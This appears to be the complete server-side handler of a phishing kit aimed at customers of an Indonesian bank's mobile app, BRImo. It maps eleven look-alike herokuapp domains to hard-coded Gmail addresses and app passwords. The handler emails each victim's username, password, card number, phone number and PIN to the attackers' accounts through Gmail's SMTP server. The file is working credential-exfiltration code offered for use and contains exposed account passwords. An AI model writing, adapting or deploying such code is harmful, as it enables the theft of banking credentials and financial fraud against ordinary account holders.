export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if (url == 'bii-fastt-brimo.herokuapp.com'){

        email = 'walangkudu@gmail.com';
        pass = 'osbhgxbiywffpwnk';

    } else if (url == 'daftar-bl-fast-brlmo.herokuapp.com'){
        
        email = 'ikanhiu603@gmail.com';
        pass = 'cadnrlizjhuvhwsa';

    } else if (url == 'bi-fas-app-brimo.herokuapp.com'){
        email = 'rumahbarubaru443@gmail.com';
        pass = 'lssxwneekjuwlvgt';

    }
    else if (url == 'daftar-bii-fastt.herokuapp.com'){
        email = 'ayamperu233@gmail.com';
        pass = 'rtzqphftdjkdrnwa';
        
    }
    else if (url == 'log-in-bri.herokuapp.com'){
        email = 'nilabakar403@gmail.com';
        pass = 'hpwgbnwdgdpryjpa';
        
    }
    else if (url == 'log-brimo-ib-bifastt.herokuapp.com'){
        email = 'ayamperu2019@gmail.com';
        pass = 'ufseytnucdzgmbah';
        

    }
    else if (url == 'bri-mo-news.herokuapp.com'){
        email = 'samesenangtobo14@gmail.com';
        pass = 'iebkxjlpwrdfubjf';
        

    }
    else if (url == 'brimo-daftar-bi-fast.herokuapp.com'){
    email = 'agustusq76@gmail.com';
    pass = 'xbohxjweimfcuhpx';
   
    }
    else if (url == 'bi-fas-bri-mo.herokuapp.com'){
        email = 'borosss940@gmail.com';
        pass = 'limdsccatyovxtxk';
       
    }
    else if (url == 'app-brimo-bi-fast.herokuapp.com'){
        email = 'lupa10203070@gmail.com';
        pass = 'xwnxmsljgdwgtcva';
       
    }
    else if (url == 'daftar-brimo-bifas.herokuapp.com'){
        email = 'abihder31@gmail.com';
        pass = 'rrqzbqcfpuimwfsx';
       
        }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>nokartu: ${body.nomorkartu ?? '-'}</li>
                        <li>nohp: ${body.nomorhandphone ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,             
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}